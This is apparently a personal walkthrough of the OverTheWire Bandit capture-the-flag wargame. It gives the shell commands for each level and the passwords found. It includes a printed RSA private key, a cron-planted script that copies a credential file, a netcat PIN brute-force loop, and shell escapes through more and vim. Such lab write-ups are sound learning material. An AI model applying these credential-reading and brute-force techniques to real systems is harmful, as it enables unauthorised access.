
## Level 0
```
ssh bandit0@bandit.labs.overthewire.org -p 2220
```

## Level 0 -> 1
```
ls
cat readme
```
<pass: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL>
```
ssh bandit1@bandit.labs.overthewire.org -p 2220
```

## Level 1 -> 2
```
ls
cat ./-
```
<pass: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi>

## Level 2 -> 3
```
ls
cat "spaces in this filename"
```
<pass: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG>

## Level 3 -> 4
```
ls
cd inhere
ls -a
cat .hidden
```
<pass: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe>

## Level 4 -> 5
```
ls
cd inhere
file *
file ./*
cat ./-file07
```
<pass: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR>

## Level 5 -> 6
```
ls
cd inhere
ls
ls -al * | grep -B 10 1033
cat maybehere07/.file2
```
<pass: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU>

## Level 6 -> 7
```
cd ../..
find ./ -group bandit6 -user bandit7 -size 33c
```
**found  ./var/lib/dpkg/info/bandit7.password**
```
cat ./var/lib/dpkg/info/bandit7.password
```
<pass: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S>

## Level 7 -> 8
```
cat data.txt | grep millionth
```
<pass: TESKZC0XvTetK0S9xNwm25STk5iWrBvP>

## Level 8 -> 9
```
ls
sort data.txt | uniq -u
```
<pass: EN632PlfYiZbn3PhVK3XOGSlNInNE00t>

## Level 9 -> 10
```
ls
cat data.txt | grep "="
strings data.txt
```
<pass: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s>

## Level 10 -> 11
```
ls
cat data.txt
base64 -d data.txt
```
<pass: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM>

## Level 11 -> 12
```
ls
cat data.txt
```
**used CyberChef cipher to decode ROT13**
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=R3VyIGNuZmZqYmVxIHZmIFdJQU9PU0Z6TWpYWEJDMEtvU0tCYko4cHVRbTVsSUVp

<pass: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv>

## Level 12 -> 13 
```
ls
cat data.txt
mkdir /tmp/newfile666
cp data.txt /tmp/newfile666
cd /tmp/newfile666
xxd -r data.txt data
file data
mv data data.gz
gzip -d data.gz
file data
mv data data.bz2
bzip2 -d data.bz2
file data
mv data data.gz
gzip -d data.gz
file data
tar -x -f data
file data5.bin
tar -x -f data5.bin
file data6.bin
bzip2 -d data6.bin
file data6.bin.out
tar -x -f data6.bin.out
file data8.bin
mv data8.bin data8.gz
gzip -d data8.gz
file data8
cat data8
```
<pass: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw>

## Level 13 -> 14
```
ls
ssh bandit14@localhost -i sshkey.private -p 2220
```
**logged into bandit14**
```
cat /etc/bandit_pass/bandit14
```
<pass: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq>

## Level 14 -> 15
```
nc localhost 30000
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
```
<pass: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt>

## Level 15 -> 16
```
openssl s_client -connect localhost:30001
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
```
<pass: JQttfApK4SeyHwDlI9SXGR50qclOAil1>

## Level 16 -> 17
```
nmap localhost -p31000-32000 -sV --version-intensity 1
31518, 31790 had ssl ports
nc localhost 31518
JQttfApK4SeyHwDlI9SXGR50qclOAil1
31518 turned out to be an echo port
nc localhost 31790
JQttfApK4SeyHwDlI9SXGR50qclOAil1
```
**returned this RSA key**
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```
**saved this key in /tmp/bandit17password.key**
```
cd /tmp
chmod 600 bandit17password.key
ssh -i bandit17password.key bandit17@localhost -p 2220
ls
diff passwords.new passwords.old
tried both passwords - didn't work
cd /etc/bandit_pass
cat bandit17
```
<pass: VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e>

## Level 17 -> 18
```
diff passwords.new passwords.old
```
<pass: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg>

## Level 18 -> 19
```
saw "Byebye !"
ssh -T bandit18@bandit.labs.overthewire.org -p 2220
ls
cat readme
```
<pass: awhqfNnAbc1naukrpqDYcF95h7HoMTrC>

## Level 19 -> 20
```
./bandit20-do
./bandit20-do id
./bandit20-do cat /etc/bandit_pass/bandit20
```
<pass: VxCazJaVykI6W36BkBU0mJTCM8rR95XT>

## Level 20 -> 21
```
opened two terminals 1. netcat listener 2. for giving the password
nc -l 5000 < /etc/bandit_pass/bandit20
got password in 1st terminal
```
<pass: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq>

## Level 21 -> 22
```
cd /etc/cron.d
cat cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
<pass: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff>

## Level 22 -> 23
```
cd /etc/cron.d
cat cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
$(echo I am user bandit22 | md5sum | cut -d ' ' -f 1)
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
<pass: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G>

## Level 23 -> 24
```
cd /etc/cron.d
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
touch /tmp/getpswd.sh 
vim /tmp/getpswd.sh
```
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/s8n.txt
```
```
chmod 777 /tmp/getpswd.sh
touch /tmp/s8n.txt
chmod 666 /tmp/s8n.txt
cp /tmp/getpswd.sh /var/spool/bandit24/foo
```
**wait**
```
cat /tmp/s8n.txt
```
<pass: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar>

## Level 24 -> 25
```
nano /tmp/getpswd.sh
```
```
#!/bin/bash

for i in {1000..9999}
do	       
	echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done
```
```
./getpswd.sh | nc localhost 30002
```
<pass: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d>

## Level 25 -> 26 -> 27
```
cat /etc/passwd | grep bandit26
cat /usr/bin/showtext
```
**used more on a text.txt file
minimized the terminal**
```
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
v
:e /etc/bandit_pass/bandit26
```
<pass: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1>
```
:set shell=/bin/bash
:shell
*entered the shell of bandit26*
./bandit27-do cat /etc/bandit_pass/bandit27
```
<pass: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS>

## Level 27 -> 28
```
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
cd repo
cat README
```
<pass: AVanL161y9rsbcJIsFHuw35rjaOM19nR>

## Level 28 -> 29
```
mktemp -d
cd <folder>
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
cd repo
cat README.md
git log -p
```
<pass: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S>

## Level 29 -> 30
```
mktemp -d
cd <folder>
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
cd repo
cat README.md
git log -p
git branch -a
git checkout origin/dev
cat README.md
```
<pass: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS>

## Level 30 -> 31
```
mktemp -d
cd <folder>
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
cd repo
cat README.md
git log -p
git branch -a
git tag
git show secret
```
<pass: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt>

## Level 31 -> 32
```
mktemp -d
cd <folder>
git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
cd repo
cat README.md
vim key.txt
git add key.txt
rm .gitignore
git add key.txt
git commit -m "May i come in?"
git push origin master
```
<pass: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y>

## Level 32 -> 33
```
$0
ls -alt
whoami
cat /etc/bandit_pass/bandit33
```
<pass: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy>








